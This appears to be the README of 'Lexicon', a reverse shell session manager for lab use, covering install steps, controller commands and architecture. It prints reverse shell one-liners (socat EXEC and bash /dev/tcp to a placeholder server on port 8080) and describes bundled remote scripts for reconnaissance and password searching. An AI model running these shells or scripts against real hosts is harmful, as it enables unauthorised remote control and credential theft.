# Lexicon

Lexicon is a lightweight CLI tool for managing multiple reverse shell sessions in local cybersecurity lab environments.

It provides centralized session control, command execution, and modular scripting across multiple hosts.

Unlike traditional single-session listeners (e.g., netcat), Lexicon is designed for multi-session management, making it ideal for homelabs, red team practice, and controlled testing environments.

⚠️ Disclaimer: This tool is intended for home lab and educational use only. It is designed to operate within controlled local network environments and is not intended for deployment over the public internet.

---

## Features

* Multi-session reverse shell handling
* PTY-based interaction (stable shell behavior)
* Session discovery and switching
* Command execution with output collection
* Script execution on remote hosts
* Built-in safeguards for long-running commands
* Systemd integration for persistence
* Simple install/uninstall workflow

---

## Quick Example

Connect from a Target using one of the following:
```bash
socat TCP:<SERVER_IP>:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

bash -i >& /dev/tcp/<SERVER_IP>/8080 0>&1
```
Start Lexicon:
```bash
$ lexicon

Controller starting. PTY dir: /opt/lexicon/sessions
Available Sessions (most recent first):
   1) /opt/lexicon/sessions/session-0320T140007-56821 -> /dev/pts/3 (tadmin:tty)
Select session number (or 'r' to refresh, 'q' to quit): 1

Selected:
 /opt/lexicon/sessions/session-0320T140007-56821
 (resolves to /dev/pts/3)

Now interacting with session:
/opt/lexicon/sessions/session-0320T140007-56821
Commands:
 /send <text>
 /list (show sessions)
 /switch (choose another)
 /script [name]
 /quit 

/send whoami
--- begin remote output ---
REMOTE> whoami
REMOTE> admin
 --- end remote output ---


```

---

## Overview

Lexicon consists of four main components:

* **Systemd Service (`lexicon.service`)**
  Runs a persistent `socat` listener on the host.

* **Listener (`socat.sh`)**
  Accepts incoming connections and spawns a handler per connection.

* **Handler (`handler.sh`)**
  Creates a new PTY for each connection and links it to a session file.

* **Controller (`lexicon`)**
  Interactive CLI used to manage sessions and send commands.

Additionally, Lexicon supports a **modular script system**, allowing you to execute prebuilt or custom scripts on remote hosts.

---

## Installation

Clone the repository and run the installer:

```bash
git clone git@github.com/tkennedy741/lexicon.git
cd lexicon
sudo ./install.sh
```

The installer will:

* Install dependencies (`socat`, `nmap`)
* Create directories under `/opt/lexicon`
* Install scripts and binaries
* Configure and enable the systemd service
* Add `lexicon` to your system PATH

---

## Usage

### Start the Controller

```bash
lexicon
```

You will be prompted to select an active session.

---

### Connect from Target

On the target machine, use one of the following:

```bash
socat TCP:<server_ip>:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

or

```bash
bash -i >& /dev/tcp/<server_ip>/8080 0>&1
```

---

## Commands

Once inside the controller:

### `/send <command>`

Execute a command on the remote host.

```bash
/send whoami
/send ls -la
```

---

### `/list`

List all active sessions.

---

### `/switch`

Switch to another active session.

---

### `/script`

List available scripts.

---

### `/script <name>`

Execute a script from `/opt/lexicon/scripts` on the remote host.

```bash
/script networkScan.sh
/script recon.sh
```

---

### `/kill`

Terminate the current session.

* Kills the process attached to the PTY
* Closes the connection cleanly
* Removes the session file

---

### `/quit`

Exit the controller.

---

## Script System

Scripts are stored in:

```bash
/opt/lexicon/scripts/
```

These scripts are:

* Executed **on the remote host**
* Sent over the PTY
* Run non-interactively

### Included Scripts

#### `networkScan.sh`

Performs a basic network scan using `nmap`.

#### `sysRecon.sh`

Gathers system information including:

* User info
* Network configuration
* Running processes
* Privilege checks

#### `credSearch.sh`

Searches for interesting files and greps for passwords

---

### Writing Your Own Scripts

Guidelines:

* Must be non-interactive
* Should produce limited output
* Avoid infinite loops or continuous output
* Prefer standard Linux utilities

Example:

```bash
#!/usr/bin/env bash

echo "Hostname:"
hostname

echo "Current user:"
whoami
```

---

## Architecture

### Connection Flow

1. Target connects to port 8080
2. `socat` listener accepts connection
3. `handler.sh` is spawned
4. A new PTY is created (`/dev/pts/X`)
5. A symlink is created:

```bash
/opt/lexicon/sessions/session-<timestamp>-<pid>
```

6. Controller interacts with PTY via this symlink

---

### Why PTYs?

Using PTYs instead of raw sockets provides:

* Better shell behavior
* Proper handling of input/output
* Compatibility with more commands

---

## Handling Long-Running Commands

Lexicon includes safeguards to prevent session flooding:

* Commands like `ping`, `top`, etc. are automatically limited
* Output is truncated using `head`
* Execution is wrapped with `timeout`

This ensures the controller remains responsive.

---

## Uninstall

Run the installer again:

```bash
sudo ./install.sh
```

Then choose to uninstall when prompted.

This will:

* Stop and disable the service
* Remove `/opt/lexicon`
* Remove systemd service file
* Remove controller binary

---

## Limitations

* Not a full interactive shell (not SSH)
* No job control on remote host
* Long-running processes may require manual handling
* Output parsing is line-based and time-limited

---

## Security Considerations

* Runs a listener on port 8080
* Executes arbitrary commands on connected hosts
* Should only be used in controlled environments (lab, testing)

---

## Future Improvements

* Session metadata (IP tracking, timestamps)
* Command history per session
* File transfer support
* Better output handling for streaming commands
* Plugin system for scripts

---

## Summary

Lexicon is a modular, extensible reverse shell framework designed for:

* Learning
* Lab environments
* Security experimentation

It bridges the gap between simple listeners and more complex command-and-control systems, while remaining transparent and easy to modify.

---
